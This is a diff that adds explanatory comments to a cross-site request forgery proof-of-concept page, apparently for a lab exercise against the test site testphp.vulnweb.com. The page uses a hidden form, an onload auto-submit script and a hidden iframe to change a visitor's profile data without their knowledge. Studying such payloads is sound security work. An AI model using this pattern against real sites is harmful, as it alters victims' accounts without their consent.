@@ -7,7 +7,7 @@
 </head>
 <body>
     <h1>Profile data has been changed by CSRF attack</h1>
-
+<!--    Hidden form with target   -->
 <form hidden target="transFrame" name="form1" method="post" action="http://testphp.vulnweb.com/userinfo.php" >
   <input type="hidden" name="update" value="update">
 
@@ -38,14 +38,14 @@
       </tr>
     </tbody>
   </table>
-
+<!-- Script to auto submit the form when it is loaded -->
   <script>
     document.body.onload = function() {
       document.forms[0].submit();
     };
   </script>
 </form>
-
+<!-- iframe to hide the form -->
 <iframe hidden style="" name="transFrame" id="transFrame"></iframe>
 </body>
 </html>
